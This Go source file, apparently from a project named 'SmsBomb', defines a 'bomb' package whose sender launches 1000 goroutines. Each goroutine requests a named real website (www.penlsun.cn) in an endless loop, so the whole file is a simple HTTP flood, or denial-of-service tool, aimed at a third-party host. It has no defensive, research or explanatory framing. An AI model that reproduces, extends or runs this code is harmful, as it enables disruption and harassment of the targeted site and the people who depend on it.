package bomb

import (
	"SmsBomb/helper"
	"application"
	"fmt"
)

type Sender struct {
	httpClient *helper.HttpClient
	app        *application.App
}

func (s *Sender) send() {

	for i := 0; i < 1000; i++ {
		s.app.Wg.Add(1)
		go s.sendToItisw()

	}
	s.app.Wg.Wait()
}

func (s *Sender) sendToItisw() {
	defer s.app.Wg.Add(-1)
	client := &helper.HttpClient{}

	for {
		res := client.Request("http://www.penlsun.cn", "GET")
		fmt.Printf(res)
	}

}

func NewSenderModule(app *application.App) *Sender {
	sd := &Sender{
		app: app,
	}
	return sd
}
func (s *Sender) Register(app *application.App) {

}

func (s *Sender) Run() {
	s.send()
}
